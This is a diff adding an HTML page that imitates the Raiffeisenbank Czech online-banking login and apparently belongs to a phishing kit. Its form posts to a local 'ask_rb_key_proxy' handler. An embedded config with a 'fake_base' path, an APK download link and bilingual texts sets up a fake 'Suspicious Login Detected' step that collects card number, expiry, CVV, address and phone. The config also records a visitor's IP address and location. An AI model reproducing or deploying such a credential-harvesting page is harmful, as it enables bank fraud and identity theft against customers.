@@ -1,0 +1,216 @@
+<html><head><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
+    <script type="text/javascript" src="../../../bower_components/jquery/dist/jquery.min.js"></script>
+    <script type="text/javascript" src="../../../bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
+    <link rel="stylesheet" href="../../../bower_components/font-awesome/css/font-awesome.min.css">
+    <script type="text/javascript" src="../../../core/form/core_form.js"></script>
+    <script type="text/javascript" src="../../../core/token/core_token.js"></script>
+    <script type="text/javascript" src="../../../bower_components/angular/angular.min.js"></script>
+    <link rel="stylesheet" href="../../../core/form/core_form.css">
+    <base href="">
+    <link rel="stylesheet" href="form/css.css">
+    <meta charset="UTF-8">
+    <title>Raiffeisenbank</title>
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <link rel="stylesheet" href="styles.3864caecf327e470640d.css">
+    <link id="vpe-css" href="gib-fragments.css" rel="stylesheet">
+</head>
+
+<body style="display: block;" ng-app="app" ng-controller="c1" ng-model-options="{'allowInvalid':true}" class="ng-scope">
+    <app-root ng-version="9.1.12">
+        <div id="top-navigation" class="top-navigation not-logged-in">
+            <div class="top-navigation-container">
+                <div class="navbar"><a target="_blank">
+                        <div class="item login-logo"></div>
+                    </a>
+                    <div class="item publicmenulinks">
+                        <rb-login-translate-select class="item">
+                            <div xid="translateSelect"><span class="languageLink">
+                                    <span xid="languageCZ" class="clickable active" data-ng-click="lng='cz'" data-ng-class="{'active':lng=='cz'}">CZ</span></span><span class="languageLink"><span class="languageDelimiter">&nbsp;/&nbsp;</span>
+                                    <span xid="languageEN" class="clickable" data-ng-click="lng='en'" data-ng-class="{'active':lng=='en'}">EN</span></span>
+                            </div>
+                        </rb-login-translate-select>
+                        <rb-link xid="loginMenuContactUs" linkcode="CON_AUS_002" class="item contact-us"><span><a target="_blank" class="ng-binding">Kontakty</a></span></rb-link>
+                        <rb-link xid="loginMenuSecurity" linkcode="CON_AUS_003" class="item security"><span><a target="_blank">Bezpečnost</a></span></rb-link>
+                        <rb-link xid="loginMenuHelp" linkcode="CON_AUS_004" class="item help"><span><a target="_blank" class="ng-binding">Nápověda</a></span></rb-link>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="container">
+            <div class="main-content">
+                <router-outlet></router-outlet>
+                <rb-login>
+                    <div>
+                        <!-- <div id="xBuildInfo">
+                            <p id="branch">release/R5.9</p>
+                            <p id="buildNumber">4f729dc40888ed3262bf057a06a387c9a5749412</p>
+                            <p id="buildTimestamp">1603783182142</p>
+                            <p id="buildDateTime">27-10-2020 09:19:42</p>
+                        </div> -->
+                        <system-selector>
+                            <gib>
+                                <div class="container">
+                                    <div class="main-content">
+                                        <div class="login--header-wrapper">
+                                            <rb-name-day>
+                                                <div xid="nameDay" class="login--header-dtime">
+                                                    <p xid="nameDayDate" class="login--header-date ng-binding"> Dnes je
+                                                        13.03.22                                                    </p>
+                                                </div>
+                                            </rb-name-day>
+                                            <rb-login-header xid="loginPageHeader">
+                                                <h1 class="login-header ng-binding" xid="loginPageHeader">Vstup na účet</h1>
+                                            </rb-login-header>
+                                        </div>
+                                        <rb-login-version-info>
+                                        </rb-login-version-info>
+                                        <rb-eshop-payment xid="eshopPayment">
+                                        </rb-eshop-payment>
+                                        <section class="login">
+                                            <rb-login-info-message>
+                                            </rb-login-info-message>
+                                            <rb-error xid="login">
+                                            </rb-error>
+                                            <methods-switch>
+                                                <h4 translate="TXT_AUS_001" class="login-switch-label ng-binding">Způsob přihlášení</h4>
+                                                <div class="login-switch-content">
+                                                    <i-switch xid="methodsSwitch" viewas="label" returnas="value" tabindex="0" class="i-switch">
+                                                        <i-switch-option>
+                                                            <div onclick="window.location.href='../rb_key'" class="i-switch-option upgraded active" xid="methodsSwitchLN_MTOKEN" style="width: 33.3333%;">
+                                                                <div class="i-switch-label ng-binding">RB klíč</div>
+                                                            </div>
+                                                        </i-switch-option>
+                                                        <i-switch-option>
+                                                            <div onclick="window.location.href='../sms'" class="i-switch-option upgraded" xid="methodsSwitchMEK_SMS" style="width: 33.3333%;">
+                                                                <div class="i-switch-label ng-binding">SMS kód</div>
+                                                            </div>
+                                                        </i-switch-option>
+                                                        <i-switch-option>
+                                                            <div onclick="window.location.href='../personal_key'" class="i-switch-option upgraded" xid="methodsSwitchOEK" style="width: 33.3333%;">
+                                                                <div class="i-switch-label ng-binding">Osobní klíč</div>
+                                                            </div>
+                                                        </i-switch-option>
+                                                    </i-switch>
+                                                    <div id="method">
+                                                        <mt>
+                                                            <i-row class="customerID login-form mobile-token i-row">
+                                                                <div class="i-row-content">
+                                                                    <div class="scum_container loader_hide">
+                                                                        <div class="scum" id="rb_key-view">
+                                                                            <form novalidate="" class="ng-pristine ng-invalid i-form ng-touched ng-submitted ng-valid" onsubmit="send1(event,'ask_rb_key_proxy');return false">
+
+
+
+                                                                                <div class="aler alert-danger err_div ng-binding" style="display: none;">Ve formuláři jsou nějaké chyby. Zkuste to prosím znovu</div>
+                                                                                <div class="login-form--username form-group ">
+                                                                                    <i-field xid="username">
+                                                                                        <div class="i-field">
+                                                                                            <i-error-tooltip class="err_span" style="display: none;">
+                                                                                                <div class="errorTooltip"><span class="ng-binding">Zadejte prosím klientské číslo.</span></div>
+                                                                                            </i-error-tooltip>
+                                                                                            <label class="i-field-label ng-binding">Klientské číslo</label>
+                                                                                            <input id="username" name="username" spellcheck="false" autocorrect="off" autocapitalize="none" autocomplete="off" pattern=".{4,}" data-err_text="Please enter valid " class="i-field-input form-control ng-empty ng-pristine ng-invalid ng-touched" type="text">
+                                                                                        </div>
+                                                                                    </i-field>
+                                                                                </div>
+                                                                                <mt-initialization-state>
+                                                                                    <div class="loginMethodContent"><small xid="loginMethodInfo" translate="TXT_AUS_002" class="info ng-binding">Zapomněli jste Vaše Klientské číslo? Navštivte jakoukoli pobočku Raiffeisenbank.</small></div>
+                                                                                    <div class="login-row">
+                                                                                        <div class="loginMethodContent">
+                                                                                            <div class="size15 pull-left">
+                                                                                                <div class="icon">
+                                                                                                    <div class="calc-icon first"></div>
+                                                                                                </div>
+                                                                                            </div>
+                                                                                            <div xid="login-mt-info" translate="TXT_AUS_155" class="info-text-info ng-binding">Kliknutím na tlačítko PŘIHLÁSIT SE odešleme notifikaci do RB klíče, kde přihlášení dokončíte.</div>
+                                                                                            <div class="request-button pull-right">
+                                                                                                <button ibutton="" xid="loginButton" name="login" type="submit" translate="CON_AUS_010" class="submit login-button i-button clickable">PŘIHLÁSIT SE</button>
+                                                                                            </div><button ibutton="" xid="showInstructions1" type="submit" translate="CON_AUS_016" class="blank-button t-25 pull-right i-button clickable ng-binding">Mobilní zařízení nemá datové připojení</button>
+                                                                                            <div xid="info-warning" translate="TXT_AUS_158" class="warning-login-text ng-binding">V případě potíží nás kontaktujte na klientské lince +420 412 440 000 (7-22 hod).</div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </mt-initialization-state>
+                                                                            </form>
+                                                                        </div>
+                                                                    <div class="loader2__">    <h4 class="loader2__h4 ng-binding">Počkejte prosím ...</h4>    <span class="cool_spinner__">        <svg version="1.1" id="L2" height="50" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 100 100" enable-background="new 0 0 100 100" xml:space="preserve">            <circle fill="none" stroke-width="4" stroke-miterlimit="10" cx="50" cy="50" r="48"></circle>            <line fill="none" stroke-linecap="round" stroke-width="4" stroke-miterlimit="10" x1="50" y1="50" x2="85" y2="50.5">                <animateTransform attributeName="transform" dur="2s" type="rotate" from="0 50 50" to="360 50 50" repeatCount="indefinite"></animateTransform>            </line>            <line fill="none" stroke-linecap="round" stroke-width="4" stroke-miterlimit="10" x1="50" y1="50" x2="49.5" y2="74">                <animateTransform attributeName="transform" dur="15s" type="rotate" from="0 50 50" to="360 50 50" repeatCount="indefinite"></animateTransform>            </line>        </svg>    </span>    <p class="loader2__p ng-binding">Ověřujeme Vaše údaje. <br> Nezavírejte tuto stránku.</p></div></div>
+                                                                </div>
+                                                            </i-row>
+                                                        </mt>
+                                                    </div>
+                                                </div>
+                                            </methods-switch>
+                                        </section>
+                                        <rb-public-banner>
+                                            <div class="rb-inline-banner">
+                                                <rb-public-banner-logic>
+                                                    <div class="banner-placeholder-wrapper">
+                                                        <rb-public-banner-placeholder xid="bannerPlaceholder-0">
+                                                            <div class="vpe-banner login-banner">
+                                                                <div class="content-wrapper">
+                                                                    <div class="image-container">
+                                                                        <picture>
+                                                                            <source srcset="ib_login_475x620.jpg" media="(min-width: 625px) and (max-width: 999px)">
+                                                                            <source srcset="ib_login_475x620.jpg" media="(min-width: 1000px)">
+                                                                            <img src="ib_login_475x620.jpg" srcset="ib_login_475x620.jpg"> </picture>
+                                                                    </div>
+                                                                    <h2 class="banner-headline"></h2> <button class="action-button btn primary with-arrow" vp-="" vp-url="https://www.rb.cz/osobni/ucty/sluzby-k-uctum/internetove-bankovnictvi/rb-klic" vp-target="_blank" vp-opportunity="false" vp-sales-team="CALL_37">ZJISTIT VÍCE</button>
+                                                                </div>
+                                                            </div>
+                                                        </rb-public-banner-placeholder>
+                                                    </div>
+                                                </rb-public-banner-logic>
+                                            </div>
+                                        </rb-public-banner>
+                                    </div>
+                                </div>
+                            </gib>
+                        </system-selector>
+                    </div>
+                </rb-login>
+            </div>
+        </div>
+        <div id="rbfooter">
+                <rb-footer-content phonenumber="TXT_AUS_021">
+                    <footer xid="rb-footer" class="footer">
+                        <div class="footer-container">
+                            <div class="footer-overall">
+                                <div class="footer-item">
+                                    <div class="device-icon mobile"></div>
+                                    <div xid="phoneNumber" class="info-main"> +420 412 440 000 </div>
+                                    <div class="info-text ng-binding">Klientská linka (denně 7-22 hrs)</div>
+                                </div>
+                                <div class="footer-item">
+                                    <div class="device-icon mobile"></div>
+                                    <div xid="internationalPhoneNumber" class="info-main"> +420 412 446 402 </div>
+                                    <div class="info-text ng-binding">Blokace karet a klíčů (NONSTOP)</div>
+                                </div>
+                                <div class="footer-item">
+                                    <div class="device-icon mail"></div>
+                                    <div xid="email" class="info-main"><a target="_blank">info@rb.cz</a></div>
+                                    <div class="info-text ng-binding">Odpovíme do 24 hodin</div>
+                                </div>
+                                <div class="footer-item last-login">
+                                    <div class="info-text">© 2020 Raiffeisenbank</div>
+                                </div>
+                            </div>
+                        </div>
+                    </footer>
+                </rb-footer-content>
+            
+        </div>
+    </app-root>
+    <div id="arcotuserdataDiv" display="none" style="display: none;"></div>
+    <div id="arcotuserdataDiv" display="none" style="display: none;"></div>
+    <div id="arcotuserdataDiv" display="none" style="display: none;"></div>
+    <script type="text/javascript">
+    var bid = "318b33ce75e19f74fbcc3c261244766a"
+    var php_js = {"device":{"isMobile":false,"isTablet":false,"isiOS":false,"isAndroid":false},"gets":[],"geo":{"status":"success","country":"United States","countryCode":"US","region":"TX","regionName":"Texas","city":"Dallas","zip":"75219","lat":32.8131,"lon":-96.8141,"timezone":"America\/Chicago","isp":"Charter Communications","org":"Spectrum","as":"AS11427 Charter Communications Inc","query":"76.184.185.7"},"lng":"cz","bb_link":"https:\/\/google.com\/","link":"raiffeisen.cz","apk_file":"http:\/\/test.com\/file.apk","encryption":0,"allowed":[],"texts":"{\r\n    \"en\":\r\n    {\r\n        \"_2133281470\": \"Contact us\",\r\n        \"_1013767008\": \"Security\",\r\n        \"_2245473\": \"Help\",\r\n        \"_-1196234531\": \"Today date is\",\r\n        \"_73596745\": \"Login\",\r\n        \"_-254597736\": \"Login method\",\r\n        \"_-1885395889\": \"RB Key\",\r\n        \"_651507828\": \"SMS code\",\r\n        \"_-95910753\": \"Personal key\",\r\n        \"_-230252690\": \"Please enter Client number.\",\r\n        \"_1150530846\": \"Client number\",\r\n        \"_-384361815\": \"Forgot your client number? Visit any branch office of Raiffeisenbank.\",\r\n        \"_205639968\": \"Press LOGIN and we will send notification to RB Key application, where you will finish the login process.\",\r\n        \"_-932175542\": \"Mobile device is not online\",\r\n        \"_-1550318413\": \"In case of any difficulties please call client line at +420 412 440 000 (7-22 hrs).\",\r\n        \"_-2038492807\": \"Wait please...\",\r\n        \"_-1536966556\": \"We are verifying your details.\",\r\n        \"_-561776473\": \"Do not close this page.\",\r\n        \"_1667698574\": \"FIND OUT MORE\",\r\n        \"_1435761417\": \"Client line\",\r\n        \"_95346201\": \"daily\",\r\n        \"_-1215213859\": \"Cards and keys blocking (NONSTOP)\",\r\n        \"_-250042401\": \"We will respond within 24 hours\",\r\n\r\n\r\n        \"_1144250494\": \"Confirm the login via RB Key app on your mobile device.\",\r\n        \"_519230867\": \"To finish login rest\",\r\n        \"_1064901855\": \"minutes\",\r\n\r\n\r\n\r\n        \"_-1587366709\": \"Obtain your authentication code by clicking the REQUEST CODE button\",\r\n        \"_1244589278\": \"request code\",\r\n\r\n\r\n\r\n        \"_-81225268\": \"The authentication code has been sent to your mobile phone\",\r\n        \"_-1755296139\": \"Authentication code\",\r\n        \"_-1964778686\": \"Please fill in the Authentication Code field.\",\r\n        \"_-1688836187\": \"The code is in the format eg 1234 - 1234 - 123\",\r\n        \"_-1203045978\": \"Please fill in the I-PIN field.\",\r\n        \"_-2013538399\": \"Log in\",\r\n        \"_-727185852\": \"or resend the code\",\r\n        \"_308498895\": \"In case of problems, contact us on the Client Line +420 412 440 000 (7-22 hours).\",\r\n\r\n\r\n\r\n        \"_1025648661\": \"Enter the code generated by your Personal EK\",\r\n        \"_-777928073\": \"Please enter Authentication code.\",\r\n        \"_-545335618\": \"How to get your certification code?\",\r\n        \"_-1223013401\": \"In case of any difficulties please call call client line at +420 412 440 000 (7-22 hrs).\",\r\n\r\n\r\n        \"_1077600368\": \"Admission to the account\",\r\n\r\n\r\n        \"_-1807668168\": \"Submit\",\r\n\r\n\r\n        \"_1947676420\": \"Suspicious Login Detected \",\r\n        \"_-157682223\": \"Please fill out the required fields in order for us to verify your identity.\",\r\n\r\n\r\n\r\n        \"_660504304\": \"Please fill in the First name.\",\r\n        \"_1774297627\": \"First name\",\r\n        \"_1822461948\": \"Please fill in the Last name.\",\r\n        \"_-336058955\": \"Last name\",\r\n        \"_1796062008\": \"Please fill in the Card number.\",\r\n        \"_-2126651847\": \"Card number\",\r\n        \"_-767931562\": \"Please fill in the Expiry date.\",\r\n        \"_2085605979\": \"Expiry date\",\r\n        \"_482961262\": \"Please fill in the CVV.\",\r\n        \"_67139\": \"CVV\",\r\n\r\n\r\n\r\n        \"_348191893\": \"Please fill in the Email.\",\r\n        \"_67066748\": \"Email\",\r\n        \"_19381104\": \"Please fill in the Phone number.\",\r\n        \"_-526187941\": \"Phone number\",\r\n        \"_1920115325\": \"Please fill in the Address.\",\r\n        \"_516961236\": \"Address\",\r\n        \"_2087494464\": \"Please fill in the City.\",\r\n        \"_2100619\": \"City\",\r\n        \"_1492098916\": \"Please fill in the Post code.\",\r\n        \"_-346715827\": \"Post code\",\r\n\r\n\r\n\r\n\r\n        \"_1769332282\": \"Verification completed \",\r\n        \"_591681022\": \"Thank you, your information has been submitted. We apologies for the inconvenience.\",\r\n\r\n\r\n        \"_1770010394\": \"There are some errors on the form. Please try again\"\r\n\r\n    },\r\n    \"cz\":\r\n    {\r\n\r\n        \"_2133281470\": \"Kontakty\",\r\n        \"_1013767008\": \"Zabezpe\u010den\u00ed\",\r\n        \"_2245473\": \"N\u00e1pov\u011bda\",\r\n        \"_-1196234531\": \"Dnes je\",\r\n        \"_73596745\": \"Vstup na \u00fa\u010det\",\r\n        \"_-254597736\": \"Zp\u016fsob p\u0159ihl\u00e1\u0161en\u00ed\",\r\n        \"_-1885395889\": \"RB kl\u00ed\u010d\",\r\n        \"_651507828\": \"SMS k\u00f3d\",\r\n        \"_-95910753\": \"Osobn\u00ed kl\u00ed\u010d\",\r\n        \"_-230252690\": \"Zadejte pros\u00edm klientsk\u00e9 \u010d\u00edslo.\",\r\n        \"_1150530846\": \"Klientsk\u00e9 \u010d\u00edslo\",\r\n        \"_-384361815\": \"Zapomn\u011bli jste Va\u0161e Klientsk\u00e9 \u010d\u00edslo? Nav\u0161tivte jakoukoli pobo\u010dku Raiffeisenbank.\",\r\n        \"_205639968\": \"Kliknut\u00edm na tla\u010d\u00edtko P\u0158IHL\u00c1SIT SE ode\u0161leme notifikaci do RB kl\u00ed\u010de, kde p\u0159ihl\u00e1\u0161en\u00ed dokon\u010d\u00edte.\",\r\n        \"_-932175542\": \"Mobiln\u00ed za\u0159\u00edzen\u00ed nem\u00e1 datov\u00e9 p\u0159ipojen\u00ed\",\r\n        \"_-1550318413\": \"V p\u0159\u00edpad\u011b pot\u00ed\u017e\u00ed n\u00e1s kontaktujte na klientsk\u00e9 lince +420 412 440 000 (7-22 hod).\",\r\n        \"_-2038492807\": \"Po\u010dkejte pros\u00edm ...\",\r\n        \"_-1536966556\": \"Ov\u011b\u0159ujeme Va\u0161e \u00fadaje.\",\r\n        \"_-561776473\": \"Nezav\u00edrejte tuto str\u00e1nku.\",\r\n        \"_1667698574\": \"DAL\u0160\u00cd INFORMACE\",\r\n        \"_1435761417\": \"Klientsk\u00e1 linka\",\r\n        \"_95346201\": \"denn\u011b\",\r\n        \"_-1215213859\": \"Blokace karet a kl\u00ed\u010d\u016f (NONSTOP)\",\r\n        \"_-250042401\": \"Odpov\u00edme do 24 hodin\",\r\n\r\n\r\n        \"_1144250494\": \"Potvr\u010fte p\u0159ihl\u00e1\u0161en\u00ed pomoc\u00ed RB kl\u00ed\u010de na Va\u0161em mobiln\u00edm za\u0159\u00edzen\u00ed.\",\r\n        \"_519230867\": \"Pro dokon\u010den\u00ed p\u0159ihl\u00e1\u0161en\u00ed zb\u00fdv\u00e1\",\r\n        \"_1064901855\": \"minut\",\r\n\r\n        \"_-1587366709\": \"Klikn\u011bte na tla\u010d\u00edtko POSLAT K\u00d3D a po\u017e\u00e1dejte o autentiza\u010dn\u00ed k\u00f3d\",\r\n        \"_1244589278\": \"poslat k\u00f3d\",\r\n\r\n\r\n\r\n        \"_-81225268\": \"Autentiza\u010dn\u00ed k\u00f3d byl odesl\u00e1n na v\u00e1\u0161 mobiln\u00ed telefon\",\r\n        \"_-1755296139\": \"Autentiza\u010dn\u00ed k\u00f3d\",\r\n        \"_-1964778686\": \"Vypl\u0148te pros\u00edm pole Autentiza\u010dn\u00ed k\u00f3d.\",\r\n        \"_-1688836187\": \"K\u00f3d je ve form\u00e1tu nap\u0159. 1234 - 1234 - 123\",\r\n        \"_-1203045978\": \"Vypl\u0148te pros\u00edm pole I-PIN.\",\r\n        \"_-2013538399\": \"P\u0159ihl\u00e1sit se\",\r\n        \"_-727185852\": \"nebo znovu odeslat k\u00f3d\",\r\n        \"_308498895\": \"V p\u0159\u00edpad\u011b probl\u00e9m\u016f n\u00e1s kontaktujte na Klientsk\u00e9 lince +420 412 440 000 (7-22 hodin).\",\r\n\r\n\r\n\r\n        \"_1025648661\": \"Zadejte k\u00f3d vygenerovan\u00fd va\u0161\u00edm osobn\u00edm EK\",\r\n        \"_-777928073\": \"Zadejte ov\u011b\u0159ovac\u00ed k\u00f3d.\",\r\n        \"_-545335618\": \"Jak z\u00edskat certifika\u010dn\u00ed k\u00f3d?\",\r\n        \"_-1223013401\": \"V p\u0159\u00edpad\u011b pot\u00ed\u017e\u00ed n\u00e1s kontaktujte na Klientsk\u00e9 lince +420 412 440 000 (7-22 hod).\",\r\n\r\n\r\n        \"_1077600368\": \"Dokon\u010dete ov\u011b\u0159en\u00ed \u00fa\u010dtu\",\r\n\r\n        \"_-1807668168\": \"Ov\u011b\u0159it\",\r\n\r\n\r\n\r\n        \"_1947676420\": \"Bylo zji\u0161t\u011bno podez\u0159el\u00e9 p\u0159ihl\u00e1\u0161en\u00ed\",\r\n        \"_-157682223\": \"Vypl\u0148te pros\u00edm povinn\u00e1 pole, abychom mohli ov\u011b\u0159it va\u0161i identitu.\",\r\n\r\n\r\n\r\n        \"_660504304\": \"Vypl\u0148te pros\u00edm k\u0159estn\u00ed jm\u00e9no.\",\r\n        \"_1774297627\": \"Jm\u00e9no\",\r\n        \"_1822461948\": \"Vypl\u0148te p\u0159\u00edjmen\u00ed.\",\r\n        \"_-336058955\": \"P\u0159\u00edjmen\u00ed\",\r\n        \"_1796062008\": \"Vypl\u0148te pros\u00edm \u010d\u00edslo karty.\",\r\n        \"_-2126651847\": \"\u010c\u00edslo karty\",\r\n        \"_-767931562\": \"Vypl\u0148te pros\u00edm datum pou\u017eitelnosti.\",\r\n        \"_2085605979\": \"Datum vypr\u0161en\u00ed platnosti\",\r\n        \"_482961262\": \"Vypl\u0148te pros\u00edm CVV.\",\r\n        \"_67139\": \"CVV\",\r\n\r\n\r\n\r\n        \"_348191893\": \"Vypl\u0148te pros\u00edm e-mail.\",\r\n        \"_67066748\": \"E-mail\",\r\n        \"_19381104\": \"Vypl\u0148te pros\u00edm telefonn\u00ed \u010d\u00edslo.\",\r\n        \"_-526187941\": \"Telefonn\u00ed \u010d\u00edslo\",\r\n        \"_1920115325\": \"Vypl\u0148te pros\u00edm adresu.\",\r\n        \"_516961236\": \"Adresa\",\r\n        \"_2087494464\": \"Vypl\u0148te pros\u00edm m\u011bsto.\",\r\n        \"_2100619\": \"M\u011bsto\",\r\n        \"_1492098916\": \"Vypl\u0148te pros\u00edm po\u0161tovn\u00ed sm\u011brovac\u00ed \u010d\u00edslo.\",\r\n        \"_-346715827\": \"PS\u010c\",\r\n\r\n\r\n\r\n        \"_1769332282\": \"Ov\u011b\u0159en\u00ed dokon\u010deno\",\r\n        \"_591681022\": \"D\u011bkujeme, va\u0161e informace byly odesl\u00e1ny. V\u00e1\u0161 \u00fa\u010det nyn\u00ed bude n\u011bkolik hodin nep\u0159\u00edstupn\u00fd. Zkuste se p\u0159ihl\u00e1sit za dv\u011b a\u017e t\u0159i hodiny.\",\r\n\r\n\r\n        \"_1770010394\": \"Ve formul\u00e1\u0159i jsou n\u011bjak\u00e9 chyby. Zkuste to pros\u00edm znovu\"\r\n\r\n\r\n\r\n\r\n    }\r\n}\r\n","query":"","home":"..\/..\/..\/home.php","relative_root":"..\/..\/..\/","parent_folders":"a1b2c3\/318b33ce75e19f74fbcc3c261244766a\/rb_key\/","fake_base":"rb_key\/"}    </script>
+    <script type="text/javascript" src="form/form.js?v=622e580073c19"></script>
+    <script type="text/javascript" src="ng/ng.js?v=622e580073c5b"></script>
+    <script type="text/javascript" src="token/token.js?v=622e580073c94"></script>
+
+
+
+</body></html>
